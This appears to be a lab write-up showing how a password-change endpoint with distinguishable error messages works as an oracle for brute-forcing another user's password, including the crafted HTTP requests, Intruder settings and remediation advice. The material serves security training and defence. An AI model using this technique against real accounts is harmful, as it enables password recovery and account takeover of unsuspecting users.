# Password Brute-Force via Password Change

## Overview

This lab demonstrates how a password-change feature can expose a password oracle that enables brute-forcing another user's current password.

The weakness was not in the primary login endpoint. Instead, the authenticated password-change workflow returned different error messages depending on whether the supplied current password was correct. By deliberately submitting two different new passwords, the response could be used to distinguish a correct current-password guess from an incorrect one without actually changing the target account's password.

This turns an account-management endpoint into an alternative password-verification interface and can bypass protections that are only enforced on the main login route.

## Initial Testing

The password-change workflow accepted parameters equivalent to:

```http
POST /my-account/change-password HTTP/2
Host: <lab-host>
Cookie: session=<valid-session>
Content-Type: application/x-www-form-urlencoded

username=wiener&
current-password=peter&
new-password-1=<new-password>&
new-password-2=<new-password>
```

Several combinations were tested to understand the server-side logic.

An important testing issue appeared immediately: submitting a correct current password together with two matching new passwords genuinely changes the password and may invalidate the current session. Subsequent requests can therefore misleadingly produce redirects to the login page.

To avoid modifying the account during testing, the two new-password fields were intentionally kept different.

## Identifying the Oracle

With two different new passwords, the application exposed two distinguishable responses.

When the current password was incorrect:

```text
Current password is incorrect
```

When the current password was correct:

```text
New passwords do not match
```

This behavior creates a reliable password oracle:

```text
candidate current password
        |
        v
password-change request
        |
        +--> incorrect candidate --> "Current password is incorrect"
        |
        +--> correct candidate ----> "New passwords do not match"
```

The second response proves that the server accepted the supplied current password and only failed at the later new-password validation stage.

## Exploitation

The request was modified so that the target account was `carlos`, while the two new passwords remained deliberately different:

```http
POST /my-account/change-password HTTP/2
Host: <lab-host>
Cookie: session=<valid-session>
Content-Type: application/x-www-form-urlencoded

username=carlos&
current-password=§PAYLOAD§&
new-password-1=abc123&
new-password-2=xyz789
```

Only `current-password` was selected as the Intruder payload position.

A Sniper attack was then run using the supplied password candidate list.

### Response Matching

A Grep - Match rule was configured for:

```text
New passwords do not match
```

Most password candidates produced the normal incorrect-password response. One candidate produced the distinctive new-password-mismatch response.

The matching payload was:

```text
qawsx
```

This identified Carlos's current password.

## Why the Attack Works

The endpoint performs multiple validation steps in a distinguishable order:

1. Validate the supplied current password.
2. Validate whether the two new passwords match.
3. Change the password if all checks pass.

Because the application returns a different error depending on which validation stage fails, an attacker can infer whether the current password was correct.

The password-change endpoint therefore acts as a secondary authentication oracle.

The vulnerability is especially significant when brute-force protections are applied to `/login` but not consistently applied to password-change or account-management endpoints.

## Root Cause

The root cause is a combination of:

- distinguishable error messages that reveal whether the current password was correct;
- insufficient brute-force protection on the password-change workflow;
- accepting a client-controlled target username in an authenticated account-management request;
- inconsistent security controls between authentication-related endpoints.

The application treats the password-change route as an account-management function, but from an attacker's perspective it also performs password verification and must therefore be protected like a login endpoint.

## Security Impact

An attacker with access to a valid session can use the password-change endpoint to test password candidates for another user.

Successful exploitation can lead to:

- recovery of the target user's password;
- unauthorized login as the victim;
- complete account takeover;
- bypass of login-specific rate limiting or lockout controls;
- password reuse attacks against other services if the recovered password is reused elsewhere.

## Remediation

Password-change functionality should be hardened as an authentication-sensitive endpoint.

Recommended controls include:

- bind password changes to the currently authenticated account rather than accepting an arbitrary username from the client;
- apply rate limiting, throttling, and abuse detection to current-password verification;
- enforce protections consistently across all endpoints that verify credentials;
- avoid responses that reveal which individual validation step failed when that distinction creates a credential oracle;
- require recent authentication for sensitive account changes;
- invalidate or rotate sessions appropriately after successful password changes;
- monitor repeated failed current-password submissions as potential brute-force activity.

## Key Takeaway

Brute-force testing should not be limited to the primary login endpoint.

Any feature that verifies an existing password can become an authentication oracle if its responses distinguish correct from incorrect credentials. Password-change, email-change, account-deletion, and other sensitive account workflows should therefore be assessed with the same scrutiny as login functionality.
